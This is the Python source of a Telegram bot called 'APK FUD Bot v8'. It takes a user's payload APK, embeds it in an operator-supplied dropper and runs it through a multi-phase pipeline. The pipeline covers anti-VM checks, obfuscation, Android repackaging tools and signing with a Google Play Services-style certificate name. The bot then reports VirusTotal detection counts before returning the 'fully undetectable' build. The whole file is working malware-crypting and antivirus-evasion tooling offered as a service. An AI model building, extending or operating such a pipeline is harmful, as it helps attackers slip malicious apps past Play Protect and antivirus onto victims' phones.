#!/usr/bin/env python3
"""
APK FUD Bot v8 — Focused GPP Bypass Pipeline

FLOW:
  User sends payload APK → bot fuses it with the active dropper → 7-phase pipeline

PIPELINE (7 phases):
  Phase 0: Extract Payload Properties (aapt)
  Phase 1: PC Hardening (Anti-VM x7, Obfuscapk x5, APKBleach, DEX magic)
  Phase 2: Dropper Build (from active dropper template)
  Phase 3: Identity + Embed payload → dropper_embedded.apk
  Phase 4: Android Hardening via GitHub Actions emulator:
             NP Manager: 15 selected tools
             MT Manager: 8 selected tools
             APKTool M:  decompile → resource fix → rebuild
  Phase 5: PC Post-Processing (zipalign prep, ApkBleach pass 2)
  Phase 6: Final Sign (SHA384withRSA, V1+V2+V3, Google Play Services DN)
  Phase 7: Deliver result

DROPPER MANAGEMENT (owner only):
  /setdropper  — send new dropper APK → replaces active dropper template
  /showdropper — show current dropper info
"""
import os, sys, shutil, asyncio, traceback, time, re, subprocess, functools, json, hashlib, urllib.request
from pathlib import Path
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (Application, CommandHandler, MessageHandler,
                          CallbackQueryHandler, filters, ContextTypes)

from config import (
    TELEGRAM_TOKEN, ADMIN_USER_IDS,
    INPUT_DIR, OUTPUT_DIR, TEMP_DIR, CLONE_DIR,
    DROPPER_DIR, ACTIVE_DROPPER_APK, ACTIVE_DROPPER_DIR,
    TOOL_APKS_DIR, NP_MANAGER_APK, MT_MANAGER_APK, APKTOOL_M_APK,
    MAX_FILE_SIZE, ANDROID_DEVICE_IP, APKTOOL,
)
from utils.logger import setup_logger, get_last_lines
from utils.adb_helper import adb_connect

import phases.phase0_extract
import phases.phase1_payload_hardening
import phases.phase2_dropper_edits
import phases.phase3_identity_embed
import phases.phase4_dropper_hardening
import phases.phase5_pc_pipeline
import phases.phase6_final_sign
import phases.phase7_deploy

logger = setup_logger()

# ── VirusTotal scan ──────────────────────────────────────────────────────────
async def _virustotal_scan(apk_path: str) -> dict | None:
    """Scan APK with VirusTotal API.
    Returns dict: {detected, total, link} or None if key not set / scan fails.
    Runs non-blocking. Times out after 120 s total."""
    vt_key = os.environ.get("VT_API_KEY", "")
    if not vt_key:
        return None
    try:
        loop = asyncio.get_running_loop()

        def _sha256():
            h = hashlib.sha256()
            with open(apk_path, "rb") as f:
                for chunk in iter(lambda: f.read(65536), b""):
                    h.update(chunk)
            return h.hexdigest()

        sha = await loop.run_in_executor(None, _sha256)
        vt_link = f"https://www.virustotal.com/gui/file/{sha}"

        def _check_existing():
            req = urllib.request.Request(
                f"https://www.virustotal.com/api/v3/files/{sha}",
                headers={"x-apikey": vt_key},
            )
            try:
                with urllib.request.urlopen(req, timeout=10) as r:
                    return json.loads(r.read())
            except Exception:
                return None

        existing = await loop.run_in_executor(None, _check_existing)
        if existing:
            stats = (existing.get("data", {})
                             .get("attributes", {})
                             .get("last_analysis_stats", {}))
            if stats:
                total     = sum(stats.values())
                malicious = stats.get("malicious", 0) + stats.get("suspicious", 0)
                return {"detected": malicious, "total": total, "link": vt_link}

        # Not cached — upload the file
        def _upload():
            boundary = "----VTFormBoundary"
            with open(apk_path, "rb") as f:
                apk_bytes = f.read()
            body = (
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="file"; filename="sample.apk"\r\n'
                f"Content-Type: application/vnd.android.package-archive\r\n\r\n"
            ).encode() + apk_bytes + f"\r\n--{boundary}--\r\n".encode()
            req = urllib.request.Request(
                "https://www.virustotal.com/api/v3/files",
                data=body,
                headers={
                    "x-apikey": vt_key,
                    "Content-Type": f"multipart/form-data; boundary={boundary}",
                },
            )
            with urllib.request.urlopen(req, timeout=90) as r:
                return json.loads(r.read())

        upload_data = await asyncio.wait_for(
            loop.run_in_executor(None, _upload), timeout=100
        )
        analysis_id = upload_data.get("data", {}).get("id", "")
        if not analysis_id:
            return None

        # Poll for results (up to 90 s)
        for _ in range(9):
            await asyncio.sleep(10)

            def _poll(aid=analysis_id):
                req = urllib.request.Request(
                    f"https://www.virustotal.com/api/v3/analyses/{aid}",
                    headers={"x-apikey": vt_key},
                )
                with urllib.request.urlopen(req, timeout=10) as r:
                    return json.loads(r.read())

            poll_data = await loop.run_in_executor(None, _poll)
            attr   = poll_data.get("data", {}).get("attributes", {})
            status = attr.get("status", "")
            if status == "completed":
                stats     = attr.get("stats", {})
                total     = sum(stats.values())
                malicious = stats.get("malicious", 0) + stats.get("suspicious", 0)
                return {"detected": malicious, "total": total, "link": vt_link}

        return {"detected": -1, "total": -1, "link": vt_link, "pending": True}
    except Exception as e:
        logger.warning(f"[VT] Scan error: {e}")
        return None


# ── Build queue (one file at a time) ─────────────────────────────────────────
_BUILD_QUEUE  = asyncio.Queue()
_CANCELLED    = False

# Owner "pending upload" state — only used for dropper replacement
# Maps chat_id → "dropper"
_PENDING_DROPPER: dict[int, bool] = {}

# Owner tool-APK upload state — maps chat_id → tool name (e.g. "mt_manager")
_PENDING_TOOLS: dict[int, str] = {}

# ── Session persistence (restart recovery) ────────────────────────────────────
_SESSION_FILE = Path("/home/runner/workspace/bot_session.json")
_API_BASE = "http://localhost:8080"

def _save_session_chat(chat_id: int, apk_name: str) -> None:
    """Save chat_id before Phase 4 so we can deliver the result after a restart."""
    try:
        data: dict = {}
        if _SESSION_FILE.exists():
            data = json.loads(_SESSION_FILE.read_text())
        data["chat_id"]    = chat_id
        data["apk_name"]   = apk_name
        data["saved_at"]   = time.time()
        _SESSION_FILE.write_text(json.dumps(data))
    except Exception:
        pass

def _clear_session() -> None:
    try:
        if _SESSION_FILE.exists():
            _SESSION_FILE.unlink()
    except Exception:
        pass

async def _recover_session(bot) -> None:
    """On startup: check if there's an incomplete pipeline job and resume delivery."""
    if not _SESSION_FILE.exists():
        return
    try:
        data    = json.loads(_SESSION_FILE.read_text())
        chat_id = data.get("chat_id")
        job_id  = data.get("job_id")
        apk_name = data.get("apk_name", "output.apk")
        if not chat_id or not job_id:
            return
        logger.info(f"[Recovery] Found session: job={job_id} chat={chat_id} — resuming monitoring")
        asyncio.create_task(_monitor_recovered_job(bot, chat_id, job_id, apk_name))
    except Exception as e:
        logger.warning(f"[Recovery] Failed to read session: {e}")

async def _monitor_recovered_job(bot, chat_id: int, job_id: str, apk_name: str) -> None:
    """Poll the API server for a recovered job and deliver the result."""
    import urllib.request
    msg = await bot.send_message(
        chat_id=chat_id,
        text="♻️ Bot restarted — resuming Phase 4 monitoring...\n(emulator still running on GitHub Actions)"
    )
    max_wait = 90 * 60
    started  = time.time()
    last_msg = ""
    while time.time() - started < max_wait:
        await asyncio.sleep(30)
        try:
            with urllib.request.urlopen(f"{_API_BASE}/api/pipeline/status/{job_id}", timeout=10) as r:
                status = json.loads(r.read())
        except Exception:
            continue
        job_status = status.get("status", "unknown")
        message    = status.get("message", "")
        if message != last_msg:
            try:
                await msg.edit_text(
                    f"♻️ Recovered job — Phase 4\n"
                    f"Status: {job_status}\n{message}"
                )
            except Exception:
                pass
            last_msg = message
        if job_status == "completed":
            _clear_session()
            try:
                dl_url = f"{_API_BASE}/api/pipeline/download/{job_id}"
                with urllib.request.urlopen(dl_url, timeout=120) as r:
                    apk_bytes = r.read()
                size_mb = len(apk_bytes) / (1024 * 1024)
                await msg.delete()
                await bot.send_document(
                    chat_id=chat_id,
                    document=apk_bytes,
                    filename=f"fud_{apk_name}",
                    caption=(
                        f"✅ FUD Build Complete (recovered after restart)!\n\n"
                        f"📦 Size: {size_mb:.2f} MB\n"
                        f"🔐 Signed: SHA384withRSA V1+V2+V3\n"
                        f"📛 Package: {apk_name}"
                    )
                )
            except Exception as e:
                await msg.edit_text(f"✅ Done — but download failed: {e}\nFetch manually: /api/pipeline/download/{job_id}")
            return
        elif job_status == "failed":
            _clear_session()
            err = status.get("message", "Unknown error")
            await msg.edit_text(f"❌ Pipeline failed (recovered session):\n{err}")
            return
    _clear_session()
    await msg.edit_text("❌ Recovery timeout — emulator took too long after restart.")

# ── Phase metadata ─────────────────────────────────────────────────────────────
_PHASE_NAMES = {
    0: "Phase 0 — Extracting payload properties",
    1: "Phase 1 — PC hardening (Anti-VM, Obfuscapk, APKBleach)",
    2: "Phase 2 — Building dropper from template",
    3: "Phase 3 — Embedding payload into dropper",
    4: "Phase 4 — Android hardening (NP Manager + MT Manager + APKTool M)",
    5: "Phase 5 — PC post-processing",
    6: "Phase 6 — Final sign (SHA384withRSA V1+V2+V3)",
    7: "Phase 7 — Delivering result",
    8: "Complete",
}
_PHASE_DURATIONS = {0: 5, 1: 45, 2: 20, 3: 15, 4: 480, 5: 20, 6: 10, 7: 5}


# ── Auth helper ───────────────────────────────────────────────────────────────
def _is_owner(update: Update) -> bool:
    uid = str(update.effective_user.id)
    if not ADMIN_USER_IDS:
        return True   # no admin list — everyone is owner (dev mode)
    return uid in ADMIN_USER_IDS


# ── ETA helpers ───────────────────────────────────────────────────────────────
def _fmt_time(secs: float) -> str:
    if secs < 60:
        return f"{int(secs)}s"
    return f"{int(secs // 60)}m {int(secs % 60)}s"


async def _update_status(msg, phase_num: int, start_time: float):
    elapsed   = time.time() - start_time
    remaining = sum(_PHASE_DURATIONS.get(p, 10) for p in range(phase_num, 8))
    remaining = max(int(remaining), 0)
    kb = [[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]]
    text = (f"⏳ {_PHASE_NAMES[phase_num]}\n"
            f"⏱ Elapsed: {_fmt_time(elapsed)} | ETA: ~{_fmt_time(remaining)}")
    try:
        await msg.edit_text(text, reply_markup=InlineKeyboardMarkup(kb))
    except Exception:
        pass


def _start_ticker(msg, phase_num: int, start_time: float) -> asyncio.Task:
    """Launch a background task that re-edits the status message every 30s.

    This keeps the Telegram message looking alive during long blocking phases
    (apktool decompile/rebuild, obfuscapk, etc.).  The returned Task must be
    cancelled once the phase finishes.
    """
    async def _tick():
        while True:
            await asyncio.sleep(30)
            await _update_status(msg, phase_num, start_time)
    return asyncio.create_task(_tick())


async def _stop_ticker(task: asyncio.Task | None) -> None:
    if task and not task.done():
        task.cancel()
        try:
            await task
        except asyncio.CancelledError:
            pass


def _check_cancelled():
    global _CANCELLED
    if _CANCELLED:
        _CANCELLED = False
        raise Exception("Build cancelled by user")


async def _in_thread(fn, *args):
    """Run a blocking synchronous function in a thread pool.

    This keeps the asyncio event loop (and Telegram polling) alive
    even when a phase runs a long subprocess or sleeps for minutes.
    """
    loop = asyncio.get_running_loop()
    return await loop.run_in_executor(None, functools.partial(fn, *args))


# ── Dropper ready-check ────────────────────────────────────────────────────────
def _dropper_ready() -> bool:
    return ACTIVE_DROPPER_APK.exists() and ACTIVE_DROPPER_DIR.exists()


# ── Pipeline orchestrator ─────────────────────────────────────────────────────
async def run_pipeline(apk_path: str, msg):
    global _CANCELLED
    _CANCELLED = False
    start_time = time.time()

    shutil.rmtree(TEMP_DIR, ignore_errors=True)
    TEMP_DIR.mkdir(parents=True, exist_ok=True)

    ticker = None
    try:
        # Phase 0 — extract payload properties
        _check_cancelled()
        await _update_status(msg, 0, start_time)
        ticker = _start_ticker(msg, 0, start_time)
        base_info = await _in_thread(phases.phase0_extract.run, apk_path)
        await _stop_ticker(ticker); ticker = None
        _check_cancelled()

        # Phase 1 — PC hardening
        await _update_status(msg, 1, start_time)
        ticker = _start_ticker(msg, 1, start_time)
        output_apk = await _in_thread(phases.phase1_payload_hardening.run, apk_path, base_info)
        await _stop_ticker(ticker); ticker = None
        _check_cancelled()

        # Phase 2 — build dropper from ACTIVE template
        await _update_status(msg, 2, start_time)
        ticker = _start_ticker(msg, 2, start_time)
        dropper_ready = await _in_thread(phases.phase2_dropper_edits.run, base_info)
        await _stop_ticker(ticker); ticker = None
        _check_cancelled()

        # Phase 3 — identity + embed payload
        await _update_status(msg, 3, start_time)
        ticker = _start_ticker(msg, 3, start_time)
        dropper_embedded = await _in_thread(phases.phase3_identity_embed.run, dropper_ready, output_apk, base_info)
        await _stop_ticker(ticker); ticker = None
        _check_cancelled()

        # Phase 4 — Android hardening (NP Manager 15 + MT Manager 8 + APKTool M)
        # Save session before entering so bot can recover the result after a restart
        _save_session_chat(msg.chat_id, os.path.basename(apk_path))
        await _update_status(msg, 4, start_time)
        ticker = _start_ticker(msg, 4, start_time)
        dropper_hardened = await _in_thread(phases.phase4_dropper_hardening.run, dropper_embedded)
        await _stop_ticker(ticker); ticker = None
        _check_cancelled()

        # Phase 5 — PC post-processing
        await _update_status(msg, 5, start_time)
        ticker = _start_ticker(msg, 5, start_time)
        dropper_pc = await _in_thread(phases.phase5_pc_pipeline.run, dropper_hardened, base_info)
        await _stop_ticker(ticker); ticker = None
        _check_cancelled()

        # Phase 6 — final sign
        await _update_status(msg, 6, start_time)
        ticker = _start_ticker(msg, 6, start_time)
        dropper_final = await _in_thread(phases.phase6_final_sign.run, dropper_pc)
        await _stop_ticker(ticker); ticker = None
        _check_cancelled()

        # Phase 7 — deliver
        await _update_status(msg, 7, start_time)
        ticker = _start_ticker(msg, 7, start_time)
        await _in_thread(phases.phase7_deploy.run, dropper_final)
        await _stop_ticker(ticker); ticker = None

        final_name = os.path.basename(apk_path)
        final_path = str(OUTPUT_DIR / final_name)
        shutil.copy(dropper_final, final_path)

        await _update_status(msg, 8, start_time)
        _clear_session()
        return final_path, None

    except Exception as e:
        await _stop_ticker(ticker)
        _clear_session()
        if "cancelled" in str(e).lower():
            await msg.edit_text("❌ Build cancelled.")
            return None, "cancelled"
        logger.error(f"[!] Pipeline error: {e}", exc_info=True)
        await msg.edit_text(f"❌ Pipeline failed:\n{str(e)[:300]}")
        return None, str(e)


# ── Queue worker ──────────────────────────────────────────────────────────────
async def _queue_worker():
    while True:
        try:
            apk_path, chat_id, bot = await _BUILD_QUEUE.get()
            qsize = _BUILD_QUEUE.qsize()
            logger.info(f"[*] Processing: {os.path.basename(apk_path)}, {qsize} more in queue")

            msg = await bot.send_message(
                chat_id=chat_id,
                text=f"⏳ Starting build...\nQueue: 1 of {1 + qsize}"
            )

            if ANDROID_DEVICE_IP:
                adb_connect(ANDROID_DEVICE_IP)

            final_apk, error = await run_pipeline(apk_path, msg)

            if final_apk and os.path.exists(final_apk) and error != "cancelled":
                size_mb = os.path.getsize(final_apk) / (1024 * 1024)

                # VirusTotal scan (non-blocking — deliver regardless of result)
                vt_line = ""
                try:
                    vt = await asyncio.wait_for(_virustotal_scan(final_apk), timeout=130)
                    if vt:
                        if vt.get("pending"):
                            vt_line = f"\n🔬 VT: scan submitted (check later)\n   {vt['link']}"
                        elif vt.get("detected", -1) < 0:
                            vt_line = f"\n🔬 VT: scan pending\n   {vt['link']}"
                        else:
                            icon = "🟢" if vt["detected"] == 0 else ("🟡" if vt["detected"] <= 3 else "🔴")
                            vt_line = (
                                f"\n{icon} VT: {vt['detected']}/{vt['total']} engines\n"
                                f"   {vt['link']}"
                            )
                except (asyncio.TimeoutError, Exception) as vt_err:
                    logger.warning(f"[VT] Skipped: {vt_err}")

                with open(final_apk, "rb") as f:
                    await bot.send_document(
                        chat_id=chat_id,
                        document=f,
                        filename=os.path.basename(final_apk),
                        caption=(
                            f"✅ FUD Build Complete!\n\n"
                            f"📦 Size: {size_mb:.2f} MB\n"
                            f"🔐 Signed: SHA384withRSA  V1+V2+V3\n"
                            f"📛 Package: {os.path.basename(apk_path)}\n\n"
                            f"Pipeline:\n"
                            f"  ✅ Phase 1: Anti-VM + Obfuscapk + APKBleach\n"
                            f"  ✅ Phase 2-3: Dropper built + payload embedded\n"
                            f"  ✅ Phase 4: NP Manager (15) + MT Manager (8) + APKTool M\n"
                            f"  ✅ Phase 5-6: PC post + Google Play Services cert"
                            f"{vt_line}"
                        )
                    )
                try:
                    await msg.delete()
                except Exception:
                    pass
            elif error != "cancelled":
                await bot.send_message(chat_id=chat_id,
                                       text=f"❌ Pipeline failed:\n{error or 'Unknown error'}")
                try:
                    await msg.delete()
                except Exception:
                    pass

            # Cleanup — never store payloads
            for p in [apk_path, final_apk]:
                try:
                    if p and os.path.exists(p):
                        os.remove(p)
                except Exception:
                    pass
            shutil.rmtree(TEMP_DIR, ignore_errors=True)

            _BUILD_QUEUE.task_done()
        except Exception as e:
            logger.error(f"[!] Queue worker error: {e}", exc_info=True)
            _BUILD_QUEUE.task_done()
            await asyncio.sleep(2)


# ── Dropper install helper ────────────────────────────────────────────────────
def _aapt_badging(apk_path: str) -> dict:
    """Read package name + version from APK using aapt (works on any APK)."""
    info = {"pkg": "unknown", "version": "unknown", "sdk": "unknown"}
    aapt_bin = "/home/runner/workspace/android-tools-bin/android-14/aapt"
    if not os.path.exists(aapt_bin):
        aapt_bin = "aapt"
    try:
        r = subprocess.run(
            [aapt_bin, "dump", "badging", apk_path],
            capture_output=True, text=True, timeout=30
        )
        for line in r.stdout.splitlines():
            if line.startswith("package:"):
                m = re.search(r"name='([^']+)'", line)
                if m:
                    info["pkg"] = m.group(1)
                m2 = re.search(r"versionName='([^']+)'", line)
                if m2:
                    info["version"] = m2.group(1)
            if line.startswith("sdkVersion:"):
                info["sdk"] = line.split("'")[1]
    except Exception:
        pass
    return info


async def _install_new_dropper(apk_path: str, chat_id: int, bot) -> bool:
    """Decompile new dropper APK and set it as the active template."""
    msg = await bot.send_message(chat_id=chat_id,
                                 text="⏳ Installing new dropper template...\nDecompiling APK...")
    try:
        # 1. Save raw APK
        shutil.copy(apk_path, str(ACTIVE_DROPPER_APK))

        # 2. Decompile with --no-res (avoids failing on custom resource types)
        if ACTIVE_DROPPER_DIR.exists():
            shutil.rmtree(ACTIVE_DROPPER_DIR)
        ACTIVE_DROPPER_DIR.mkdir(parents=True, exist_ok=True)

        r = subprocess.run(
            [APKTOOL, "d", "--no-res", "-f",
             "-o", str(ACTIVE_DROPPER_DIR), str(ACTIVE_DROPPER_APK)],
            capture_output=True, text=True, timeout=120
        )
        if r.returncode != 0:
            await msg.edit_text(f"❌ Dropper decompile failed:\n{r.stderr[:300]}")
            return False

        # 3. Read package info via aapt (binary manifest-safe)
        info    = _aapt_badging(str(ACTIVE_DROPPER_APK))
        size_kb = os.path.getsize(str(ACTIVE_DROPPER_APK)) // 1024

        await msg.edit_text(
            f"✅ New dropper installed!\n\n"
            f"📦 Package: {info['pkg']}\n"
            f"🔢 Version: {info['version']}\n"
            f"💾 Size: {size_kb} KB\n\n"
            f"All future builds will use this dropper."
        )
        logger.info(f"[DROPPER] New dropper installed: {info['pkg']} v{info['version']}")
        return True

    except Exception as e:
        await msg.edit_text(f"❌ Dropper install failed:\n{str(e)[:300]}")
        logger.error(f"[DROPPER] Install error: {e}", exc_info=True)
        return False


# ── Document upload handler ───────────────────────────────────────────────────
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Routes document uploads:
    - If owner has a pending dropper replacement → install new dropper
    - Otherwise → treat as user payload APK and run full pipeline
    """
    file    = update.message.document
    chat_id = update.effective_chat.id

    if not file or not file.file_name:
        await update.message.reply_text("Send a file as document.")
        return

    fname = file.file_name.lower()

    # ── Owner: tool APK replacement ─────────────────────────────────────────
    tool_slot = _PENDING_TOOLS.pop(chat_id, None)
    if tool_slot and _is_owner(update):
        if not fname.endswith(".apk"):
            await update.message.reply_text("Expected .apk file.")
            return

        label, dest_path = _TOOL_SLOT_MAP[tool_slot]
        dl_msg = await update.message.reply_text(f"⬇️ Downloading {label}.apk...")
        file_obj = await file.get_file()
        tmp_path = str(TOOL_APKS_DIR / f"_tmp_{label}.apk")
        await file_obj.download_to_drive(tmp_path)

        try:
            size_mb = os.path.getsize(tmp_path) / 1048576
            os.replace(tmp_path, str(dest_path))
            await dl_msg.edit_text(
                f"✅ {label}.apk installed ({size_mb:.1f} MB)\n"
                f"Path: tool_apks/{label}.apk\n"
                f"Future GitHub Actions runs will download this tool."
            )
            logger.info(f"[TOOLS] {label}.apk updated: {dest_path} ({size_mb:.1f} MB)")
        except Exception as e:
            try: os.remove(tmp_path)
            except Exception: pass
            await dl_msg.edit_text(f"❌ Tool install failed:\n{str(e)[:300]}")
            logger.error(f"[TOOLS] Install error for {label}: {e}", exc_info=True)
        return

    # ── Owner: dropper replacement ──────────────────────────────────────────
    if _PENDING_DROPPER.pop(chat_id, False) and _is_owner(update):
        if not fname.endswith(".apk"):
            await update.message.reply_text("Expected .apk file.")
            return

        dl_msg = await update.message.reply_text("⬇️ Downloading dropper...")
        file_obj   = await file.get_file()
        local_path = str(DROPPER_DIR / file.file_name)
        await file_obj.download_to_drive(local_path)
        await dl_msg.delete()

        await _install_new_dropper(local_path, chat_id, context.bot)
        try:
            os.remove(local_path)
        except Exception:
            pass
        return

    # ── Regular payload APK → full pipeline ────────────────────────────────
    if not fname.endswith(".apk"):
        await update.message.reply_text("Only .apk files are supported.")
        return

    # Check dropper is ready before accepting
    if not _dropper_ready():
        await update.message.reply_text(
            "⚠️ No dropper template set.\n"
            "The bot operator must run /setdropper first."
        )
        return

    msg = await update.message.reply_text("⬇️ Downloading APK...")
    try:
        import uuid as _uuid
        file_obj = await file.get_file()
        # Prefix with a UUID so re-submissions of the same filename get separate files.
        # Without this, a second upload overwrites the first while it is still queued,
        # and the first run's cleanup then deletes the shared file before the second run starts.
        unique_prefix = _uuid.uuid4().hex[:8]
        apk_path = str(INPUT_DIR / f"{unique_prefix}_{file.file_name}")
        await file_obj.download_to_drive(apk_path)

        size = os.path.getsize(apk_path)
        if size > MAX_FILE_SIZE:
            await msg.edit_text(f"File too large: {size / 1048576:.1f} MB (max 100 MB)")
            os.remove(apk_path)
            return

        qsize = _BUILD_QUEUE.qsize()
        await msg.edit_text(
            f"✅ APK received ({size / 1048576:.2f} MB)\n"
            f"Queue position: #{1 + qsize} — processing one at a time..."
        )
        await _BUILD_QUEUE.put((apk_path, chat_id, context.bot))
    except Exception as e:
        logger.error(f"[!] Upload error: {e}", exc_info=True)
        await msg.edit_text(f"❌ Error: {str(e)[:300]}")


# ── Commands ──────────────────────────────────────────────────────────────────
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    owner_tag = " [OWNER]" if _is_owner(update) else ""
    dropper_ok = "✅" if _dropper_ready() else "❌ Not set"
    await update.message.reply_text(
        f"APK FUD Bot v8{owner_tag}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "GPP Bypass Pipeline — 7 Phases\n\n"
        "📤 Send your .apk → automatically fused with dropper + full pipeline\n\n"
        "Pipeline:\n"
        "  Ph.0  Extract payload properties\n"
        "  Ph.1  Anti-VM + Obfuscapk + APKBleach\n"
        "  Ph.2  Build dropper from template\n"
        "  Ph.3  Embed payload into dropper\n"
        "  Ph.4  NP Manager (15) + MT Manager (8) + APKTool M\n"
        "  Ph.5  PC post-processing\n"
        "  Ph.6  SHA384withRSA V1+V2+V3\n"
        "  Ph.7  Deliver output\n\n"
        f"Dropper: {dropper_ok}\n\n"
        "Commands:\n"
        "/status        — Bot + queue status\n"
        "/setdropper    — [Owner] Replace active dropper\n"
        "/showdropper   — [Owner] View current dropper info\n"
        "/logs          — Last log lines\n"
        "/cancel        — Cancel current build\n"
    )


async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    qsize    = _BUILD_QUEUE.qsize()
    has_drop = ACTIVE_DROPPER_APK.exists()
    drop_pkg = "—"
    if has_drop:
        info     = _aapt_badging(str(ACTIVE_DROPPER_APK))
        drop_pkg = info["pkg"]

    await update.message.reply_text(
        f"Bot Status\n"
        f"━━━━━━━━━━\n"
        f"Queue:    {qsize} pending\n"
        f"Dropper:  {'✅ ' + drop_pkg if has_drop else '❌ Not set'}\n"
        f"Template: {'✅ Ready' if ACTIVE_DROPPER_DIR.exists() else '❌ Not decompiled'}\n"
    )


async def cancel_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global _CANCELLED
    _CANCELLED = True
    await update.message.reply_text("Cancelling current build...")


async def _cancel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global _CANCELLED
    await update.callback_query.answer()
    _CANCELLED = True
    await update.callback_query.edit_message_text("Cancelling...")


async def logs_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    lines = get_last_lines(50)
    if len(lines) > 4000:
        lines = lines[-4000:]
    await update.message.reply_text(f"```\n{lines}\n```", parse_mode="Markdown")


# ── Owner: Tool APK management ────────────────────────────────────────────────
_TOOL_SLOT_MAP = {
    "np":  ("np_manager",  NP_MANAGER_APK),
    "mt":  ("mt_manager",  MT_MANAGER_APK),
    "atm": ("apktool_m",   APKTOOL_M_APK),
}

async def settools_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Owner: /settools [np|mt|atm] — upload a replacement tool APK."""
    if not _is_owner(update):
        await update.message.reply_text("⛔ Owner only.")
        return

    args = context.args or []
    slot = args[0].lower() if args else ""

    if slot not in _TOOL_SLOT_MAP:
        # Show current status for all tools
        def _tool_status(apk_path) -> str:
            if apk_path.exists():
                kb = apk_path.stat().st_size // 1024
                return f"✅ {kb} KB"
            return "❌ Missing"

        await update.message.reply_text(
            "Tool APK Manager\n"
            "━━━━━━━━━━━━━━━━\n"
            f"NP Manager:  {_tool_status(NP_MANAGER_APK)}\n"
            f"MT Manager:  {_tool_status(MT_MANAGER_APK)}\n"
            f"APKTool M:   {_tool_status(APKTOOL_M_APK)}\n\n"
            "Usage:  /settools <slot>  then send the APK\n"
            "  /settools np   — NP Manager (np_manager.apk)\n"
            "  /settools mt   — MT Manager (mt_manager.apk)\n"
            "  /settools atm  — APKTool M  (apktool_m.apk)\n"
        )
        return

    label, dest_path = _TOOL_SLOT_MAP[slot]
    chat_id = update.effective_chat.id
    _PENDING_TOOLS[chat_id] = slot
    await update.message.reply_text(
        f"📤 Send the {label}.apk as a document.\n"
        f"It will be saved to: tool_apks/{label}.apk\n\n"
        f"⚠️ This replaces the current tool immediately."
    )


# ── Owner: Dropper management ─────────────────────────────────────────────────
async def setdropper_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not _is_owner(update):
        await update.message.reply_text("⛔ Owner only.")
        return
    _PENDING_DROPPER[update.effective_chat.id] = True
    await update.message.reply_text(
        "📤 Send the new dropper APK as a document.\n\n"
        "The bot will:\n"
        "  1. Save it as active_dropper.apk\n"
        "  2. Decompile it with apktool\n"
        "  3. Use it for ALL future builds\n\n"
        "⚠️ This replaces the current dropper immediately."
    )


async def setvt_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Owner: /setvt <api_key> — set VirusTotal API key for this session."""
    if not _is_owner(update):
        await update.message.reply_text("⛔ Owner only.")
        return
    args = context.args or []
    if not args:
        current = "✅ Set" if os.environ.get("VT_API_KEY") else "❌ Not set"
        await update.message.reply_text(
            f"VirusTotal API Key: {current}\n\n"
            "Usage: /setvt <your_api_key>\n"
            "Get a free key: https://www.virustotal.com/gui/join-us\n\n"
            "Key is held in memory for this session only.\n"
            "For permanent storage: add VT_API_KEY to Replit Secrets."
        )
        return
    os.environ["VT_API_KEY"] = args[0]
    await update.message.reply_text(
        "✅ VirusTotal API key set for this session.\n"
        "All future builds will be scanned automatically.\n\n"
        "Tip: Add VT_API_KEY to Replit Secrets to persist across restarts."
    )
    logger.info("[VT] API key set via /setvt command")


async def showdropper_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not _is_owner(update):
        await update.message.reply_text("⛔ Owner only.")
        return

    if not ACTIVE_DROPPER_APK.exists():
        await update.message.reply_text(
            "❌ No active dropper set.\n"
            "Use /setdropper to upload one."
        )
        return

    # Use aapt — works on any APK, including those with binary/custom resources
    info    = _aapt_badging(str(ACTIVE_DROPPER_APK))
    size_kb = os.path.getsize(str(ACTIVE_DROPPER_APK)) // 1024

    # Min SDK from apktool.yml (text file, always written by apktool)
    min_sdk = "unknown"
    yml = ACTIVE_DROPPER_DIR / "apktool.yml"
    if yml.exists():
        for line in yml.read_text().splitlines():
            if "minSdkVersion:" in line:
                min_sdk = line.split(":", 1)[1].strip().strip("'\"")
                break

    await update.message.reply_text(
        f"Active Dropper\n"
        f"━━━━━━━━━━━━━━\n"
        f"Package:  {info['pkg']}\n"
        f"Version:  {info['version']}\n"
        f"Min SDK:  {min_sdk}\n"
        f"Size:     {size_kb} KB\n"
        f"Template: {'✅ Decompiled & ready' if ACTIVE_DROPPER_DIR.exists() else '❌ Not decompiled'}\n\n"
        f"Use /setdropper to replace it."
    )


# ── Entry point ───────────────────────────────────────────────────────────────
async def _error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    """Suppress transient network errors; log everything else."""
    from telegram.error import NetworkError, TimedOut
    err = context.error
    if isinstance(err, (NetworkError, TimedOut)):
        # Transient — python-telegram-bot retries automatically, no action needed
        logger.debug(f"[Telegram] Transient network error (auto-retry): {err}")
        return
    logger.error(f"[Telegram] Unhandled error: {err}", exc_info=err)


async def post_init(application):
    asyncio.create_task(_queue_worker())
    logger.info("[+] Queue worker started")
    await _recover_session(application.bot)


def main():
    if not TELEGRAM_TOKEN:
        print("[!] TELEGRAM_TOKEN env var not set — bot cannot start", flush=True)
        sys.exit(1)

    app = (
        Application.builder()
        .token(TELEGRAM_TOKEN)
        .post_init(post_init)
        .build()
    )

    app.add_handler(CommandHandler("start",       start))
    app.add_handler(CommandHandler("status",      status_cmd))
    app.add_handler(CommandHandler("cancel",      cancel_cmd))
    app.add_handler(CommandHandler("logs",        logs_cmd))
    app.add_handler(CommandHandler("setdropper",  setdropper_cmd))
    app.add_handler(CommandHandler("showdropper", showdropper_cmd))
    app.add_handler(CommandHandler("settools",    settools_cmd))
    app.add_handler(CommandHandler("setvt",       setvt_cmd))
    app.add_handler(CallbackQueryHandler(_cancel_callback, pattern="^cancel$"))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_error_handler(_error_handler)

    logger.info("[+] APK FUD Bot v8 — Focused GPP Bypass Pipeline")
